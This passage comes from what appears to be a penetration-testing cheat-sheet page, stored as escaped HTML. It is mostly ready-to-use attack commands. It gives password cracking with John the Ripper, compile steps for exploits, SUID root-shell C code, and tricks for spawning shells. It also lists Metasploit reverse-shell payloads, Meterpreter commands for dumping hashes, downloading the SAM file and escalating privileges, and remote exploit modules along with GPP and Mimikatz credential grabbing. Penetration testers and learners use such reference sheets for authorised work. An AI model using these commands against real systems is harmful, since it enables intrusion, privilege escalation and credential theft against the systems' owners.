  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
             &lt;p&gt;&lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt hashes&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;JTR password cracking&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
          &lt;p&gt;&lt;code&gt;john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;JTR forced descrypt cracking with wordlist&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
          &lt;p&gt;&lt;code&gt;john --format=descrypt hash --show&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;JTR forced descrypt brute force cracking&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;windows-penetration-testing-commands&quot;&gt;Windows Penetration Testing Commands&lt;/h2&gt;

&lt;p&gt;See &lt;strong&gt;Windows Penetration Testing Commands&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;linux-penetration-testing-commands&quot;&gt;Linux Penetration Testing Commands&lt;/h2&gt;

&lt;p&gt;See Linux Commands Cheat Sheet (right hand menu) for a list of Linux Penetration testing commands, useful for local system enumeration.&lt;/p&gt;

&lt;h2 id=&quot;compiling-exploits&quot;&gt;Compiling Exploits&lt;/h2&gt;

&lt;p&gt;Some notes on compiling exploits.&lt;/p&gt;

&lt;h3 id=&quot;identifying-if-c-code-is-for-windows-or-linux&quot;&gt;Identifying if C code is for Windows or Linux&lt;/h3&gt;

&lt;p&gt;C #includes will indicate which OS should be used to build the exploit.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;process.h, string.h, winbase.h, windows.h, winsock2.h&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Windows exploit code&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, &lt;br /&gt; sys/sockt.h, sys/types.h, unistd.h&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Linux exploit code&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;build-exploit-gcc&quot;&gt;Build Exploit GCC&lt;/h3&gt;

&lt;p&gt;Compile exploit gcc.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;gcc -o exploit exploit.c&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Basic GCC compile&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;gcc-compile-32bit-exploit-on-64bit-kali&quot;&gt;GCC Compile 32Bit Exploit on 64Bit Kali&lt;/h3&gt;

&lt;p&gt;Handy for cross compiling 32 bit binaries on 64 bit attacking machines.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;gcc -m32 exploit.c -o exploit&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Cross compile 32 bit binary on 64 bit Linux&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;compile-windows-exe-on-linux&quot;&gt;Compile Windows .exe on Linux&lt;/h3&gt;

&lt;p&gt;Build / compile windows exploits on Linux, resulting in a .exe file.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Compile windows .exe on Linux&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;suid-binary&quot;&gt;SUID Binary&lt;/h2&gt;

&lt;p&gt;Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.&lt;/p&gt;

&lt;p&gt;below are some quick copy and pate examples for various shells:&lt;/p&gt;

&lt;h3 id=&quot;suid-c-shell-for-binbash&quot;&gt;SUID C Shell for /bin/bash&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;       &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;suid-c-shell-for-binsh&quot;&gt;SUID C Shell for /bin/sh&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;       &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;building-the-suid-shell-binary&quot;&gt;Building the SUID Shell binary&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; suid suid.c  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;For 32 bit:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gcc &lt;span class=&quot;nt&quot;&gt;-m32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; suid suid.c  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h2&gt;

&lt;p&gt;See &lt;a href=&quot;/blog/reverse-shell-cheat-sheet/&quot;&gt;Reverse Shell Cheat Sheet&lt;/a&gt; for a list of useful Reverse Shells.&lt;/p&gt;

&lt;h2 id=&quot;tty-shells&quot;&gt;TTY Shells&lt;/h2&gt;

&lt;p&gt;Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like &lt;code&gt;su&lt;/code&gt; from reverse shells.&lt;/p&gt;

&lt;h3 id=&quot;python-tty-shell-trick&quot;&gt;Python TTY Shell Trick&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;spawn-interactive-sh-shell&quot;&gt;Spawn Interactive sh shell&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;spawn-perl-tty-shell&quot;&gt;Spawn Perl TTY Shell&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;perl&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;—&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;exec &quot;/bin/sh&quot;;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;spawn-ruby-tty-shell&quot;&gt;Spawn Ruby TTY Shell&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;spawn-lua-tty-shell&quot;&gt;Spawn Lua TTY Shell&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lua&quot; data-lang=&quot;lua&quot;&gt;&lt;span class=&quot;nb&quot;&gt;os.execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/sh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;spawn-tty-shell-from-vi&quot;&gt;Spawn TTY Shell from Vi&lt;/h3&gt;

&lt;p&gt;Run shell commands from vi:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;:!bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;spawn-tty-shell-nmap&quot;&gt;Spawn TTY Shell NMAP&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;metasploit-cheat-sheet&quot;&gt;Metasploit Cheat Sheet&lt;/h2&gt;

&lt;p&gt;A basic metasploit cheat sheet that I have found handy for reference.&lt;/p&gt;

&lt;p&gt;Basic Metasploit commands, useful for reference, for pivoting see - &lt;a href=&quot;/blog/ssh-meterpreter-pivoting-techniques/&quot;&gt;Meterpreter Pivoting&lt;/a&gt; techniques.&lt;/p&gt;

&lt;h3 id=&quot;meterpreter-payloads&quot;&gt;Meterpreter Payloads&lt;/h3&gt;

&lt;h3 id=&quot;windows-reverse-meterpreter-payload&quot;&gt;Windows reverse meterpreter payload&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;set payload windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Windows reverse tcp payload&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;windows-vnc-meterpreter-payload&quot;&gt;Windows VNC Meterpreter payload&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;set payload windows/vncinject/reverse_tcp&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;set ViewOnly false&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter Windows VNC Payload&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-reverse-meterpreter-payload&quot;&gt;Linux Reverse Meterpreter payload&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;set payload linux/meterpreter/reverse_tcp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter Linux Reverse Payload&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;meterpreter-cheat-sheet&quot;&gt;Meterpreter Cheat Sheet&lt;/h2&gt;

&lt;p&gt;Useful meterpreter commands.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;upload file c:\\windows&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter upload file to Windows target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;download c:\\windows\\repair\\sam /tmp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter download file from Windows target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;download c:\\windows\\repair\\sam /tmp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter download file from Windows target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;execute -f c:\\windows\temp\exploit.exe&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Meterpreter run .exe on target - handy for executing uploaded exploits&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;execute -f cmd -c &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Creates new channel with cmd shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ps&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
	    &lt;p&gt;Meterpreter show processes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;shell&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
	    &lt;p&gt;Meterpreter get shell on the target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;getsystem&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
	    &lt;p&gt;Meterpreter attempts priviledge escalation the target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;    
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;hashdump&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
	    &lt;p&gt;Meterpreter attempts to dump the hashes on the target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;portfwd add –l 3389 –p 3389 –r target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
	    &lt;p&gt;Meterpreter create port forward to target machine&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;portfwd delete –l 3389 –p 3389 –r target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
	    &lt;p&gt;Meterpreter delete port forward&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;common-metasploit-modules&quot;&gt;Common Metasploit Modules&lt;/h2&gt;

&lt;p&gt;Top metasploit modules.&lt;/p&gt;

&lt;h3 id=&quot;remote-windows-metasploit-modules-exploits&quot;&gt;Remote Windows Metasploit Modules (exploits)&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/windows/smb/ms08_067_netapi&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;MS08_067 Windows 2k, XP, 2003 Remote Exploit&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/windows/dcerpc/ms06_040_netapi&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/windows/smb/&lt;br /&gt;ms09_050_smb2_negotiate_func_index&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;local-windows-metasploit-modules-exploits&quot;&gt;Local Windows Metasploit Modules (exploits)&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/windows/local/bypassuac&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Bypass UAC on Windows 7 + Set target + arch, x86/64&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;auxilary-metasploit-modules&quot;&gt;Auxilary Metasploit Modules&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use auxiliary/scanner/http/dir_scanner&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit HTTP directory scanner&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use auxiliary/scanner/http/jboss_vulnscan&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit JBOSS vulnerability scanner&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use auxiliary/scanner/mssql/mssql_login&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit MSSQL Credential Scanner&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use auxiliary/scanner/mysql/mysql_version&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit MSSQL Version Scanner&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use auxiliary/scanner/oracle/oracle_login&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit Oracle Login Module&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;metasploit-powershell-modules&quot;&gt;Metasploit Powershell Modules&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/multi/script/web_delivery&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit powershell payload delivery module&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;post/windows/manage/powershell/exec_powershell&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit upload and run powershell script through a session&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/multi/http/jboss_maindeployer&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit JBOSS deploy&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use exploit/windows/mssql/mssql_payload&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit MSSQL payload&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;post-exploit-windows-metasploit-modules&quot;&gt;Post Exploit Windows Metasploit Modules&lt;/h3&gt;

&lt;p&gt;Windows Metasploit Modules for privilege escalation.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;run post/windows/gather/win_privs&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit show privileges of current user&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;use post/windows/gather/credentials/gpp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasploit grab GPP saved passwords&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;load mimikatz -&amp;gt; wdigest&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Metasplit load Mimikatz&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
